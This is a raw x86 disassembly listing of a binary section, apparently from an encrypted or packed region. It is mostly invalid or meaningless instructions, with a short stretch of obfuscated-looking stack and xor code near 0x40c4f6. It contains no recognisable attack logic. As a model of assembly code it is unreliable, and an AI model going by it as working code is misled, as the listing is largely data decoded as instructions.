  40c166:	jns    0x40c11f
  40c168:	dec    edi
  40c169:	icebp  
  40c16a:	retf   
  40c16b:	fs mov edx,edi
  40c16e:	retf   0x3797
  40c171:	out    dx,al
  40c172:	sub    al,0xe9
  40c174:	xchg   ebx,eax
  40c175:	out    dx,al
  40c176:	xchg   esp,eax
  40c177:	stos   BYTE PTR es:[edi],al
  40c178:	fcomp  QWORD PTR [edx+0x16]
  40c17b:	or     BYTE PTR [esi+0x7eca1ac3],bl
  40c181:	daa    
  40c182:	ja     0x40c13a
  40c184:	push   es
  40c185:	mov    edx,0x375399c
  40c18a:	jmp    0xbe873458
  40c18f:	inc    esi
  40c190:	mov    gs,WORD PTR [esi+0x1a]
  40c193:	pop    ebx
  40c194:	or     eax,0x2b6d0084
  40c199:	pop    eax
  40c19a:	aad    0xde
  40c19c:	outs   dx,BYTE PTR ds:[esi]
  40c19d:	xchg   BYTE PTR ds:0x3c5aa2ff,dh
  40c1a3:	jae    0x40c190
  40c1a5:	pop    ecx
  40c1a6:	aas    
  40c1a7:	jb     0x40c16d
  40c1a9:	push   ebx
  40c1aa:	pusha  
  40c1ab:	and    al,0xe
  40c1ad:	or     al,0x19
  40c1af:	jg     0x40c160
  40c1b1:	(bad)  [eax+ebp*8]
  40c1b4:	jbe    0x40c1f5
  40c1b6:	test   al,0x45
  40c1b8:	and    DWORD PTR [ebp-0x2db8427f],ebx
  40c1be:	cmp    bh,BYTE PTR [ecx+0x2e277d74]
  40c1c4:	bound  ecx,QWORD PTR [ecx-0x7f]
  40c1c7:	dec    edx
  40c1c8:	xchg   edx,eax
  40c1c9:	ds sbb eax,0xfd24710a
  40c1cf:	test   al,0x5a
  40c1d1:	pop    edx
  40c1d2:	nop
  40c1d3:	jmp    0x5927:0x1b7a5224
  40c1da:	scas   eax,DWORD PTR es:[edi]
  40c1db:	es cmc 
  40c1dd:	sub    esi,DWORD PTR [ebp-0x7e]
  40c1e0:	mov    ecx,0x82dc3693
  40c1e5:	pop    esi
  40c1e6:	sub    bh,BYTE PTR [edx+0x69e373d5]
  40c1ec:	and    bh,BYTE PTR [edi]
  40c1ee:	leave  
  40c1ef:	daa    
  40c1f0:	cs aas 
  40c1f2:	mov    al,ds:0x8e75ff97
  40c1f7:	sub    DWORD PTR [ecx+0x3f],ecx
  40c1fa:	iret   
  40c1fb:	retf   
  40c1fc:	inc    eax
  40c1fd:	lds    eax,FWORD PTR [edx+0x6d]
  40c200:	int3   
  40c201:	mov    ch,0x9
  40c203:	dec    edx
  40c204:	scas   al,BYTE PTR es:[edi]
  40c205:	mov    al,ds:0x65d57677
  40c20a:	ficom  DWORD PTR [ebx]
  40c20c:	jle    0x40c228
  40c20e:	pop    eax
  40c20f:	aas    
  40c210:	ins    BYTE PTR es:[edi],dx
  40c211:	sub    bh,BYTE PTR [ecx+0x6f1d7727]
  40c217:	xor    bh,BYTE PTR ds:0x39ee8f3b
  40c21d:	mov    ebp,0x9dda8cd1
  40c222:	and    DWORD PTR [edx+0xb],ecx
  40c225:	les    esi,FWORD PTR [ecx-0x1f]
  40c228:	fiadd  WORD PTR [esi+0x1b]
  40c22b:	or     eax,0xaac30310
  40c230:	and    BYTE PTR [ebx],bl
  40c232:	mov    al,ds:0x9396541d
  40c237:	in     eax,0x82
  40c239:	xchg   ebx,eax
  40c23a:	lods   eax,DWORD PTR ds:[esi]
  40c23b:	mov    esp,0x315d3031
  40c240:	xchg   edi,eax
  40c241:	jnp    0x40c253
  40c243:	sti    
  40c244:	loop   0x40c222
  40c246:	ins    DWORD PTR es:[edi],dx
  40c247:	test   cl,ch
  40c249:	mov    ds:0x48dc28d4,al
  40c24e:	aad    0xd7
  40c250:	xor    BYTE PTR [eax-0x9],dh
  40c253:	mov    WORD PTR [ebx+0x9338bc4],ss
  40c259:	aaa    
  40c25a:	push   ds
  40c25b:	aaa    
  40c25c:	mov    al,0xfb
  40c25e:	jp     0x40c219
  40c260:	mov    ss:0x5770e1b8,al
  40c266:	mov    ecx,0x83c26dbd
  40c26b:	xchg   esi,eax
  40c26c:	daa    
  40c26d:	mov    eax,0xde962a3
  40c272:	sti    
  40c273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c274:	cs dec esp
  40c276:	mov    eax,ds:0x6d2db794
  40c27b:	aas    
  40c27c:	sbb    eax,0x3277f6b0
  40c281:	jmp    0x40c275
  40c283:	cld    
  40c284:	jecxz  0x40c25f
  40c286:	push   esp
  40c288:	pop    edx
  40c289:	in     al,dx
  40c28a:	nop
  40c28b:	aad    0x4f
  40c28d:	inc    edi
  40c28e:	add    al,0x84
  40c290:	fisttp WORD PTR [ecx]
  40c292:	test   al,0x70
  40c294:	sbb    al,0x7f
  40c296:	ret    
  40c297:	inc    ecx
  40c298:	inc    ebp
  40c299:	ja     0x40c2f7
  40c29b:	in     al,dx
  40c29c:	ror    DWORD PTR [esi-0xd],1
  40c29f:	fwait
  40c2a0:	xor    eax,0xffcfca1d
  40c2a5:	jb     0x40c2ec
  40c2a7:	stos   DWORD PTR es:[edi],eax
  40c2a8:	and    eax,0x3fb41e21
  40c2ad:	repnz xchg ecx,eax
  40c2af:	dec    ecx
  40c2b0:	or     al,0xfd
  40c2b2:	sbb    eax,0x16fba4f7
  40c2b7:	jnp    0x40c23d
  40c2b9:	push   eax
  40c2ba:	mov    al,BYTE PTR es:[ecx*8+0x37326931]
  40c2c2:	int3   
  40c2c3:	jo     0x40c26a
  40c2c5:	ror    BYTE PTR [esp+ebp*2],cl
  40c2c8:	push   cs
  40c2c9:	in     eax,0x3f
  40c2cb:	and    eax,0x7802285a
  40c2d0:	outs   dx,BYTE PTR ds:[esi]
  40c2d1:	cmp    DWORD PTR [edi],ebx
  40c2d3:	xchg   DWORD PTR [edx+0x2420b167],eax
  40c2d9:	in     al,0x32
  40c2db:	in     eax,dx
  40c2dc:	push   0x283e5f4d
  40c2e1:	test   DWORD PTR [esi],ecx
  40c2e3:	pop    ebx
  40c2e4:	stos   BYTE PTR es:[edi],al
  40c2e5:	push   es
  40c2e6:	jg     0x40c351
  40c2e8:	inc    esp
  40c2e9:	push   esi
  40c2ea:	inc    ecx
  40c2eb:	loopne 0x40c32f
  40c2ed:	mov    esi,0x6d56385d
  40c2f2:	(bad)  
  40c2f3:	ins    DWORD PTR es:[edi],dx
  40c2f4:	add    eax,0xebe2154a
  40c2f9:	or     al,0x3f
  40c2fb:	les    esp,FWORD PTR [ebx-0x2a6caf81]
  40c301:	out    0xfb,eax
  40c303:	in     al,dx
  40c304:	sbb    DWORD PTR [edi-0x5479a481],esi
  40c30a:	imul   esi,DWORD PTR [ecx+0x76ee49f9],0x7b
  40c311:	addr16 inc ecx
  40c313:	cli    
  40c314:	iret   
  40c315:	rol    DWORD PTR [ecx],cl
  40c317:	adc    bh,BYTE PTR [ebx-0x56]
  40c31a:	dec    esi
  40c31b:	push   eax
  40c31c:	es push 0xffffffb2
  40c31f:	cmp    eax,0x530e1b2a
  40c324:	jnp    0x40c2ad
  40c326:	imul   esi,ecx,0x17
  40c329:	add    al,0x1c
  40c32b:	int3   
  40c32c:	daa    
  40c32d:	mov    WORD PTR ds:0x8368eee7,gs
  40c333:	out    dx,al
  40c334:	inc    edi
  40c335:	mov    cl,0xe1
  40c337:	mov    al,0xcd
  40c339:	aad    0x11
  40c33b:	lock jmp 0x2f4e868f
  40c341:	mov    cl,0x7f
  40c343:	ja     0x40c2d3
  40c345:	push   ds
  40c346:	mov    dl,0x1f
  40c348:	mov    ch,0x40
  40c34a:	ss ins DWORD PTR es:[edi],dx
  40c34c:	dec    esp
  40c34d:	lods   al,BYTE PTR ds:[esi]
  40c34e:	xor    cl,BYTE PTR [ebp-0xd]
  40c351:	mov    DWORD PTR [ecx],esi
  40c353:	xchg   BYTE PTR [ebx+0x53c2f3b0],bl
  40c359:	mov    BYTE PTR [esi+0x3b],cl
  40c35c:	test   DWORD PTR [eax],ebp
  40c35e:	outs   dx,BYTE PTR ds:[esi]
  40c35f:	sub    al,0x3d
  40c361:	cli    
  40c362:	mov    al,0x3
  40c364:	lds    edi,FWORD PTR [ebx+0x1d]
  40c367:	dec    ebx
  40c368:	jmp    DWORD PTR [edx-0x26d7ab98]
  40c36e:	(bad)  
  40c36f:	jecxz  0x40c3bf
  40c371:	addr16 sub al,0xb7
  40c374:	inc    eax
  40c375:	or     al,0xad
  40c377:	fild   QWORD PTR ss:[ecx-0x3a]
  40c37b:	bound  eax,QWORD PTR [ecx-0x3d]
  40c37e:	iret   
  40c37f:	dec    edi
  40c380:	adc    WORD PTR ds:0x7944da3a,sp
  40c387:	xlat   BYTE PTR ds:[ebx]
  40c388:	scas   al,BYTE PTR es:[edi]
  40c389:	lds    ebx,FWORD PTR [esi+ebp*8]
  40c38c:	mov    al,ds:0xd179a874
  40c391:	push   ebp
  40c392:	cmp    al,0xd3
  40c394:	into   
  40c395:	mov    BYTE PTR [edx],cl
  40c397:	mov    eax,0x4633ba6a
  40c39c:	cdq    
  40c39d:	pop    eax
  40c39e:	sar    BYTE PTR ds:0x2d5565b4,cl
  40c3a4:	dec    eax
  40c3a5:	mov    ch,0x8b
  40c3a7:	jge    0x40c394
  40c3a9:	dec    edx
  40c3aa:	and    DWORD PTR [esi+0x1f],0x24
  40c3ae:	daa    
  40c3af:	mov    ecx,0xfa105a74
  40c3b4:	adc    ch,cl
  40c3b6:	test   BYTE PTR [eax],bl
  40c3b8:	adc    eax,0x84e27675
  40c3bd:	add    al,0xa2
  40c3bf:	cmp    DWORD PTR [edi+eax*8+0x69288e24],ebx
  40c3c6:	outs   dx,BYTE PTR ds:[esi]
  40c3c7:	pop    ebx
  40c3c8:	xchg   DWORD PTR [edx+0x58],edi
  40c3cb:	jbe    0x40c3cf
  40c3cd:	in     eax,dx
  40c3ce:	or     esi,DWORD PTR [esi]
  40c3d0:	inc    DWORD PTR [ecx+edx*2]
  40c3d3:	(bad)  
  40c3d4:	push   ecx
  40c3d5:	mov    eax,0x1d2d344e
  40c3da:	sub    ch,ah
  40c3dc:	(bad)  
  40c3dd:	rcr    BYTE PTR [esi-0x21be24fb],0x35
  40c3e4:	enter  0x8d11,0x3a
  40c3e8:	and    dl,dl
  40c3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3eb:	jnp    0x40c3d1
  40c3ed:	jp     0x40c377
  40c3ef:	mov    al,ds:0xdcaeaa27
  40c3f4:	aas    
  40c3f5:	mov    edi,0xa46a200e
  40c3fa:	mov    ds:0xb1badaa6,eax
  40c3ff:	popa   
  40c400:	sub    edx,DWORD PTR [ecx-0x7d]
  40c403:	ss mov ecx,0x47afca63
  40c409:	stos   BYTE PTR es:[edi],al
  40c40a:	push   es
  40c40b:	push   ds
  40c40c:	lods   al,BYTE PTR ds:[esi]
  40c40d:	jae    0x40c3d4
  40c40f:	loopne 0x40c46d
  40c411:	int3   
  40c412:	sti    
  40c413:	mov    ecx,0x16390e21
  40c418:	pop    ds
  40c419:	outs   dx,DWORD PTR ds:[esi]
  40c41a:	xor    al,0xd2
  40c41c:	pop    eax
  40c41d:	out    dx,al
  40c41e:	je     0x40c464
  40c420:	imul   ebp,DWORD PTR [esi-0x2f],0xffffffcc
  40c424:	push   cs
  40c425:	push   es
  40c426:	lods   al,BYTE PTR ds:[esi]
  40c427:	aaa    
  40c428:	xor    eax,0x65c136cd
  40c42d:	jmp    DWORD PTR gs:[edi+ecx*8]
  40c431:	dec    edi
  40c432:	jb     0x40c46e
  40c434:	mov    BYTE PTR [esi+edi*4],bl
  40c437:	cmp    al,0xae
  40c439:	add    BYTE PTR [ecx],0x65
  40c43c:	add    eax,0xf0a1bd86
  40c441:	sbb    al,0x9a
  40c443:	push   0x5570fd8f
  40c448:	cdq    
  40c449:	pop    edi
  40c44a:	pop    ecx
  40c44b:	inc    ebx
  40c44c:	mov    ebx,0x4135a27c
  40c451:	rcl    esi,1
  40c453:	cmp    BYTE PTR [ebp-0x5ce6e401],cl
  40c459:	and    BYTE PTR [ebp-0x6c],ch
  40c45c:	icebp  
  40c45d:	push   0xffffffb3
  40c45f:	add    DWORD PTR [esi],esp
  40c461:	fisttp QWORD PTR [edi]
  40c463:	adc    ch,al
  40c465:	push   cs
  40c466:	call   0xe343c4a6
  40c46b:	sub    dl,dh
  40c46d:	iret   
  40c46e:	mov    cs,ebp
  40c470:	pop    ebp
  40c471:	dec    ecx
  40c472:	mov    edx,0x59e09318
  40c477:	pusha  
  40c478:	test   BYTE PTR [esi-0x47],ch
  40c47b:	mov    edx,0xf4981140
  40c480:	nop
  40c481:	lahf   
  40c482:	cmp    DWORD PTR ds:0x3c0a4886,esp
  40c488:	in     eax,dx
  40c489:	inc    esi
  40c48a:	pop    esi
  40c48b:	mov    bl,0xd3
  40c48d:	ds inc eax
  40c48f:	ins    BYTE PTR es:[edi],dx
  40c490:	dec    edi
  40c491:	push   cs
  40c492:	push   0x43
  40c494:	inc    ebp
  40c495:	imul   eax,DWORD PTR ds:0x495d5723,0xebde9abf
  40c49f:	scas   eax,DWORD PTR es:[edi]
  40c4a0:	std    
  40c4a1:	fmul   DWORD PTR [edi-0x64]
  40c4a4:	mov    DWORD PTR [eax-0x6f],eax
  40c4a7:	mov    ah,0x28
  40c4a9:	push   es
  40c4aa:	mov    DWORD PTR [edi],edx
  40c4ac:	push   esi
  40c4ad:	push   0x64
  40c4af:	lahf   
  40c4b0:	xor    ebx,DWORD PTR [ebx-0x6b]
  40c4b3:	cmp    BYTE PTR [ebp+0x344ae1af],ah
  40c4b9:	mov    dl,0xb5
  40c4bb:	test   BYTE PTR [eax],ch
  40c4bd:	jnp    0x40c496
  40c4bf:	les    eax,FWORD PTR [edx]
  40c4c1:	jecxz  0x40c4b5
  40c4c3:	not    BYTE PTR ss:[ebx]
  40c4c6:	pop    ecx
  40c4c7:	sub    BYTE PTR [edi+0x0],ah
  40c4ca:	jo     0x40c505
  40c4cc:	push   0x98fb232e
  40c4d1:	mov    bh,BYTE PTR [ecx]
  40c4d3:	nop
  40c4d4:	or     bl,al
  40c4d6:	lock push esi
  40c4d9:	sub    al,0x0
  40c4db:	nop
  40c4dc:	iret   
  40c4dd:	pop    DWORD PTR [esi+0x63]
  40c4e0:	add    ecx,edx
  40c4e2:	or     al,0xd
  40c4e4:	push   cs
  40c4e5:	into   
  40c4e6:	fidiv  DWORD PTR [esi-0x23]
  40c4e9:	mov    bh,0x9c
  40c4eb:	loope  0x40c4ee
  40c4ed:	jle    0x40c4aa
  40c4ef:	jmp    0xd7af:0xf83b0f8
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	jb     0x40c4d2
  40c541:	sti    
  40c542:	out    dx,eax
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	(bad)  
  40c54c:	popf   
  40c54d:	and    al,0xcd
  40c54f:	or     edx,DWORD PTR [ecx]
  40c551:	mov    ah,0x18
  40c553:	mov    ah,0xf3
  40c555:	push   eax
  40c556:	sub    eax,0x4335ee92
  40c55b:	push   ss
  40c55c:	data16 mov ch,0x73
  40c55f:	mov    bl,bl
  40c561:	jne    0x40c534
  40c563:	xchg   bl,cl
  40c565:	mov    BYTE PTR [ebp+0x794dbe76],ah
  40c56b:	call   0xa3de:0x7fad5ba8
  40c572:	sub    bl,BYTE PTR [edx+eiz*2+0x3f]
  40c576:	sbb    bh,0xe9
  40c579:	dec    ecx
  40c57a:	fdiv   st,st(3)
  40c57c:	in     al,0x30
  40c57e:	add    eax,0x7662c5c0
  40c583:	in     eax,0x95
  40c585:	sbb    BYTE PTR [esi],bl
  40c587:	mov    BYTE PTR [eax],ch
  40c589:	stc    
  40c58a:	inc    edi
  40c58b:	ins    BYTE PTR es:[edi],dx
  40c58c:	xchg   edi,eax
  40c58d:	mov    ds:0xf666a933,al
  40c592:	cld    
  40c593:	mov    dh,0x62
  40c595:	push   esi
  40c596:	cwde   
  40c597:	jle    0x40c559
  40c599:	cwde   
  40c59a:	cmc    
  40c59b:	int    0x86
  40c59d:	add    BYTE PTR [edi-0xf],dh
  40c5a0:	fmul   QWORD PTR [eax+edx*4]
  40c5a3:	iret   
  40c5a4:	xor    BYTE PTR [edx],al
  40c5a6:	repnz mov ebx,0xce547e17
  40c5ac:	xchg   ebx,eax
  40c5ad:	pop    ebx
  40c5ae:	loop   0x40c5de
  40c5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b1:	xchg   edi,eax
  40c5b2:	mov    bl,0x7c
  40c5b4:	call   0x5185cd20
  40c5b9:	jb     0x40c611
  40c5bb:	mov    ah,0x31
  40c5bd:	jne    0x40c5d0
  40c5bf:	jbe    0x40c639
  40c5c1:	mov    esi,0x16cb019e
  40c5c6:	mov    bl,0x67
  40c5c8:	pop    eax
  40c5c9:	lods   al,BYTE PTR ds:[esi]
  40c5ca:	stc    
  40c5cb:	fstp   st(6)
  40c5cd:	sbb    dl,BYTE PTR [ebp+0x6f]
  40c5d0:	ja     0x40c610
  40c5d2:	or     DWORD PTR [edx-0xf3548e1],esi
  40c5d8:	aad    0xe2
  40c5da:	sub    al,0xd5
  40c5dc:	xchg   edi,eax
  40c5dd:	push   edx
  40c5de:	adc    cl,BYTE PTR [esi]
  40c5e0:	pop    ds
  40c5e1:	mov    cl,0x51
  40c5e3:	cmp    esp,ebp
  40c5e5:	lahf   
  40c5e6:	(bad)  
  40c5e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5e8:	out    dx,al
  40c5e9:	sub    DWORD PTR [eax+0x17b81050],esi
  40c5ef:	cmp    ah,BYTE PTR [edi+ecx*2+0x76]
  40c5f3:	ficom  WORD PTR [edx-0x63]
  40c5f6:	jmp    0x2f571289
  40c5fb:	cld    
  40c5fc:	xchg   BYTE PTR [edx+edx*2],al
  40c5ff:	dec    edi
  40c600:	cmc    
  40c601:	cmp    edx,DWORD PTR [edx+ebx*8-0x3e]
  40c605:	push   ds
  40c606:	pop    eax
  40c607:	sub    esi,ebp
  40c609:	repnz out dx,al
  40c60b:	add    BYTE PTR [edx-0x1b7639dd],ah
  40c611:	scas   al,BYTE PTR es:[edi]
  40c612:	sbb    BYTE PTR [ebx],ch
  40c614:	repnz xor dl,BYTE PTR [esi-0x6e5f2cb1]
  40c61b:	adc    al,BYTE PTR [edi]
  40c61d:	stc    
  40c61e:	mov    DWORD PTR [edx+eax*2],ecx
  40c621:	add    BYTE PTR [eax],al
  40c623:	lods   al,BYTE PTR ds:[esi]
  40c624:	push   esi
  40c625:	(bad)
  40c628:	cmp    dh,al
  40c62a:	gs icebp 
  40c62c:	jl     0x40c68c
  40c62e:	sub    al,0x1c
  40c630:	inc    esi
  40c631:	(bad)  
  40c632:	fchs   
  40c634:	stos   DWORD PTR es:[edi],eax
  40c635:	mov    bl,0xa0
  40c637:	adc    esp,DWORD PTR [ebx-0x44]
  40c63a:	push   cs
  40c63b:	push   edi
  40c63c:	mov    ecx,edi
  40c63e:	xchg   ebp,eax
  40c63f:	loop   0x40c6a0
  40c641:	call   DWORD PTR [edx+0x42]
  40c644:	mov    ebx,0xd28f37d8
  40c649:	gs sub eax,edx
  40c64c:	sti    
  40c64d:	test   al,0x3b
  40c64f:	add    DWORD PTR [ecx-0x9],eax
  40c652:	push   ss
  40c653:	je     0x40c655
  40c655:	fisttp WORD PTR [edi-0x5b]
  40c658:	sbb    BYTE PTR ds:0xddf95279,al
  40c65e:	inc    ebx
  40c65f:	adc    BYTE PTR [ebx],ah
  40c661:	inc    eax
  40c662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c663:	fisub  WORD PTR [ecx]
  40c665:	outs   dx,BYTE PTR ds:[esi]
  40c666:	inc    esp
  40c667:	nop
  40c668:	adc    ebx,0xb6f2a1d7
  40c66e:	(bad)  
  40c66f:	fptan  
  40c671:	mov    ds:0xff21b25d,eax
  40c676:	sbb    BYTE PTR [ebp+0x72],0xe3
  40c67a:	(bad)  
  40c67b:	cld    
  40c67c:	or     DWORD PTR [ecx-0x430f70d9],ebp
  40c682:	add    ebx,DWORD PTR [ecx+edi*2]
  40c685:	imul   eax,DWORD PTR [esi-0x25],0xa934ba97
  40c68c:	adc    DWORD PTR [edi],0xfbdca8e3
  40c692:	push   es
  40c693:	sbb    al,0xa5
  40c695:	and    al,0xfb
  40c697:	ret    0x136f
  40c69a:	sbb    bh,BYTE PTR [edx]
  40c69c:	cmp    DWORD PTR es:[edx+eax*8+0x3e4c8ac9],ecx
  40c6a4:	aam    0x35
  40c6a6:	retf   
  40c6a7:	mov    ah,0x20
  40c6a9:	pop    ds
  40c6aa:	outs   dx,BYTE PTR ds:[esi]
  40c6ab:	cmp    dl,BYTE PTR [edi+0x581c2583]
  40c6b1:	dec    edi
  40c6b2:	or     eax,0x88247f0
  40c6b7:	mov    cl,0x35
  40c6b9:	aaa    
  40c6ba:	dec    edx
  40c6bb:	cdq    
  40c6bc:	out    0xa,eax
  40c6be:	xchg   ebp,eax
  40c6bf:	sbb    BYTE PTR [esi+edx*1+0xe419175],dl
  40c6c6:	mov    bh,BYTE PTR [eax]
  40c6c8:	mov    al,ds:0xdc7d452f
  40c6cd:	and    esi,DWORD PTR [edx-0x9dbdab0]
  40c6d3:	call   0xb2113d05
  40c6d8:	pop    eax
  40c6d9:	int3   
  40c6da:	sbb    eax,0x396cc01f
  40c6df:	xor    DWORD PTR [ebp+edi*4-0x2c],ecx
  40c6e3:	push   eax
  40c6e4:	mov    bl,0x48
  40c6e6:	adc    BYTE PTR [edx-0x3d97abdd],dh
  40c6ec:	ret    0x2ec4
  40c6ef:	les    ebp,FWORD PTR [ebx+edx*1]
  40c6f2:	mov    edx,0x859c0fe
  40c6f7:	dec    edx
  40c6f8:	sub    DWORD PTR [ebp-0x67561ae2],0x58
  40c6ff:	mov    bh,0xd0
  40c701:	aad    0x20
  40c703:	pusha  
  40c704:	jnp    0x40c734
  40c706:	int    0xf
  40c708:	jg     0x40c772
  40c70a:	in     eax,0x59
  40c70c:	cdq    
  40c70d:	icebp  
  40c70e:	jmp    0x40c6c3
  40c710:	cmp    BYTE PTR ds:0x32c192e9,0x4f
  40c717:	xor    al,0xc7
  40c719:	lods   eax,DWORD PTR ds:[esi]
  40c71a:	je     0x40c767
  40c71c:	jmp    0x4447bcea
  40c721:	cld    
  40c722:	test   ecx,esp
  40c724:	in     eax,0x61
  40c726:	push   esp
  40c727:	push   eax
  40c728:	jmp    0x40c717
  40c72a:	fs fwait
  40c72c:	push   0xf
  40c72e:	sbb    ebp,esp
  40c730:	pop    ecx
  40c731:	stos   DWORD PTR es:[edi],eax
  40c732:	push   ebp
  40c733:	jae    0x40c725
  40c735:	scas   eax,DWORD PTR es:[edi]
  40c736:	sub    al,0xd9
  40c738:	adc    dh,BYTE PTR [esi+0x7c45c135]
  40c73e:	fs (bad) 
  40c740:	xchg   esp,eax
  40c741:	push   edx
  40c742:	sbb    BYTE PTR [esi],dh
  40c744:	push   esi
  40c745:	(bad)  
  40c746:	pop    ebx
  40c747:	stos   DWORD PTR es:[edi],eax
  40c748:	mov    esp,0x65c8f588
  40c74d:	pop    ds
  40c74e:	mov    ?,ebp
  40c750:	ins    DWORD PTR es:[edi],dx
  40c751:	inc    ebp
  40c752:	popf   
  40c753:	fdiv   st(4),st
  40c755:	stos   DWORD PTR es:[edi],eax
  40c756:	outs   dx,DWORD PTR ds:[esi]
  40c757:	mov    fs,WORD PTR [edi]
  40c759:	xor    eax,eax
  40c75b:	adc    BYTE PTR [ecx],0x36
  40c75e:	retf   0xeab5
  40c761:	std    
  40c762:	shl    DWORD PTR [edx+0x24],0xa1
  40c766:	pop    ebp
  40c767:	cmp    eax,0xc673d99f
  40c76c:	or     edi,ebp
  40c76e:	xor    DWORD PTR [ebp-0x32127ea8],ebp
  40c774:	lods   eax,DWORD PTR ds:[esi]
  40c775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c776:	mov    ds:0x96af252a,al
  40c77b:	call   0x2e623588
  40c780:	jbe    0x40c7f8
  40c782:	lock cli 
  40c784:	inc    edx
  40c785:	dec    ebp
  40c786:	call   DWORD PTR [esi]
  40c788:	xor    DWORD PTR [ebp-0x3cc586b6],0x26
  40c78f:	pop    edi
  40c790:	sbb    DWORD PTR [edx-0x4a],eax
  40c793:	mov    bl,0xda
  40c795:	test   eax,0x7fd3ea61
  40c79a:	ins    DWORD PTR es:[edi],dx
  40c79b:	xor    dh,BYTE PTR [ecx]
  40c79d:	scas   al,BYTE PTR es:[edi]
  40c79e:	push   esp
  40c79f:	mov    ebp,0x97b5d302
  40c7a4:	cmc    
  40c7a5:	imul   esp,DWORD PTR [eax],0xffffffbb
  40c7a8:	sbb    eax,ebx
  40c7aa:	xor    bh,BYTE PTR [ebx+0x75]
  40c7ad:	sbb    eax,ebx
  40c7af:	mov    ecx,0xb8e18ac
  40c7b4:	pushf  
  40c7b5:	icebp  
  40c7b6:	(bad)  
  40c7b7:	pop    ecx
  40c7b8:	inc    ebp
  40c7b9:	inc    esi
  40c7ba:	std    
  40c7bb:	cmp    eax,0xc6a49568
  40c7c0:	sub    BYTE PTR [ebx],cl
  40c7c2:	push   edi
  40c7c3:	nop
  40c7c4:	add    DWORD PTR [ecx-0x4c5625ae],edi
  40c7ca:	call   esp
  40c7cc:	adc    cl,BYTE PTR [ecx]
  40c7ce:	inc    ecx
  40c7cf:	fmul   DWORD PTR [eax+ebp*1]
  40c7d2:	(bad)  
  40c7d3:	stc    
  40c7d4:	inc    ecx
  40c7d5:	lods   al,BYTE PTR ds:[esi]
  40c7d6:	cwde   
  40c7d7:	push   ecx
  40c7d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d9:	mov    cs,WORD PTR [esi]
  40c7db:	call   0xa6d8:0xfec2f088
  40c7e2:	les    ebx,FWORD PTR [ebx-0xdd86db9]
  40c7e8:	loop   0x40c7d0
  40c7ea:	daa    
  40c7eb:	inc    eax
  40c7ec:	iret   
  40c7ed:	inc    edi
  40c7ee:	dec    edi
  40c7ef:	push   0x41
  40c7f1:	adc    BYTE PTR [edi-0x54b313a2],ah
  40c7f7:	mov    esi,0xea9deaf8
  40c7fc:	out    0x1a,eax
  40c7fe:	xor    DWORD PTR [ebp+0x2f],0x37
  40c802:	stos   BYTE PTR es:[edi],al
  40c803:	mov    dh,0xa6
  40c805:	jge    0x40c842
  40c807:	lods   eax,DWORD PTR ds:[esi]
  40c808:	sbb    al,dl
  40c80a:	fld    QWORD PTR [esi+0x4c]
  40c80d:	cmp    eax,0x9c272103
  40c812:	mov    edx,0x86ec24a2
  40c817:	into   
  40c818:	mov    ds:0x49781641,eax
  40c81d:	pop    ebx
  40c81e:	bound  edi,QWORD PTR [ebp-0x49ad7f05]
  40c824:	jns    0x40c7fa
  40c826:	arpl   WORD PTR [edi-0x65ab1048],dx
  40c82c:	add    edx,DWORD PTR [ebx]
  40c82e:	add    eax,DWORD PTR [edi-0x340aeb44]
  40c834:	mov    ds:0x38fce25,al
  40c839:	or     bh,BYTE PTR [ebx+0x10]
  40c83c:	mov    bl,ch
  40c83e:	icebp  
  40c83f:	inc    edx
  40c840:	js     0x40c7dd
  40c842:	(bad)  
  40c843:	out    dx,al
  40c844:	(bad)  
  40c845:	in     al,dx
  40c846:	pop    ecx
  40c847:	ret    
  40c848:	or     dh,BYTE PTR [edi-0x3f0d07c1]
  40c84e:	push   ebp
  40c84f:	xchg   esi,eax
  40c850:	inc    eax
  40c851:	out    0x2c,eax
  40c853:	cmp    eax,0xa1b19af4
  40c858:	clc    
  40c859:	or     ah,bl
  40c85b:	ret    
  40c85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85d:	push   ss
  40c85e:	imul   ah
  40c860:	cmc    
  40c861:	mov    dh,0x77
  40c863:	cdq    
  40c864:	xor    eax,0xf619050b
  40c869:	xchg   esi,eax
  40c86a:	stos   BYTE PTR es:[edi],al
  40c86b:	loopne 0x40c814
  40c86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c86e:	sar    esp,0x5b
  40c871:	ins    DWORD PTR es:[edi],dx
  40c872:	sbb    al,0x46
  40c874:	xchg   BYTE PTR [esp+esi*4],ch
  40c877:	adc    al,0xf2
  40c879:	ss jns 0x40c86f
  40c87c:	and    ebp,DWORD PTR [edi]
  40c87e:	and    esi,DWORD PTR [ebx]
  40c880:	inc    esi
  40c881:	dec    esi
  40c882:	test   al,0x37
  40c884:	sbb    ah,BYTE PTR [ecx-0x43266dd0]
  40c88a:	arpl   WORD PTR [eax-0xd],di
  40c88d:	adc    bl,BYTE PTR [ecx+0x1f898969]
  40c893:	les    ebx,FWORD PTR [eax]
  40c895:	pop    edi
  40c896:	jg     0x40c8c4
